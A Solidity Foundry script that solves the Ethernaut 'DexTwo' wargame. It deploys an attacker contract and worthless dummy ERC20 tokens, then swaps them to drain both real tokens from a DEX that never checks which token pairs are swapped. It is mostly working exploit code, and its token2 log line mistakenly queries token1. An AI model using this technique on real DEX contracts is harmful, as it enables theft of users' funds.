// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {DexTwo} from "../src/DexTwo.sol";
import {IERC20} from "openzeppelin-contracts-08/contracts/token/ERC20/IERC20.sol";

contract Attacker {

    address token1;
    address token2;
    DexTwo dex;

    constructor(address _token1, address _token2, address _dex) {
        token1 = _token1;
        token2 = _token2;
        dex = DexTwo(_dex);
    }

    function hack() external {
        DummyERC20 dummyToken1 = new DummyERC20(100);
        DummyERC20 dummyToken2 = new DummyERC20(100);

        dummyToken1.approve(address(dex), 100);
        dummyToken2.approve(address(dex), 100);

        dummyToken1.transfer(address(dex), 100);
        dummyToken2.transfer(address(dex), 100);

        dex.swap(address(dummyToken1), token1, 100);
        dex.swap(address(dummyToken2), token2, 100);
        require(IERC20(token1).balanceOf(address(dex)) == 0 && IERC20(token2).balanceOf(address(dex)) == 0, "Challange not passed");
    }
}

/// @author agadzhalov
/// @title Solution to DexTwo Ethernaut challenge
/// @notice Solution:
///         Since this check from the `swap()` method was removed:
///         `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`
///         We can actually pass and swap any token we want. This means that we can create our own dummy ERC20
///         token with no real value and swap it for a more valuable token from the DEX.
contract DexTwoScript is Script {

    DexTwo dex = DexTwo(0xEe3073DAabd8c9eb86C2c0c82840C5A09F9dAa06);
        
    address token1 = dex.token1();
    address token2 = dex.token2();

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy Attacker contract with references to both tokens and the DexTwo contract
        Attacker attacker = new Attacker(token1, token2, address(dex));

        // Execute the hack
        attacker.hack();

        // Log the balances of token1 and token2 in the Dex after the hack
        console.log("token1 dex balance", IERC20(token1).balanceOf(address(dex)));
        console.log("token2 dex balance", IERC20(token1).balanceOf(address(dex)));
        vm.stopBroadcast();
    }

}


contract DummyERC20 is IERC20 {
    string public name = "DummyToken";
    string public symbol = "DT";
    uint8 public decimals = 18;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(uint256 initialSupply) {
        _totalSupply = initialSupply * (10 ** uint256(decimals));
        _balances[msg.sender] = _totalSupply;  // Allocate initial supply to contract deployer
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(_balances[msg.sender] >= amount, "Insufficient balance");
        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(_balances[sender] >= amount, "Insufficient balance");
        require(_allowances[sender][msg.sender] >= amount, "Allowance exceeded");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][msg.sender] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }
}

// used that method for logging in Dex1
// function debug(address user) public view {
//     console.log("Dex balance");
//     console.log("token1", IERC20(token1).balanceOf(address(dex)));
//     console.log("token2", IERC20(token2).balanceOf(address(dex)));
//     console.log("");
//     console.log("User balance");
//     console.log("token1", IERC20(token1).balanceOf(user));
//     console.log("token2", IERC20(token2).balanceOf(user));
//     console.log("");
//     console.log("================");
// }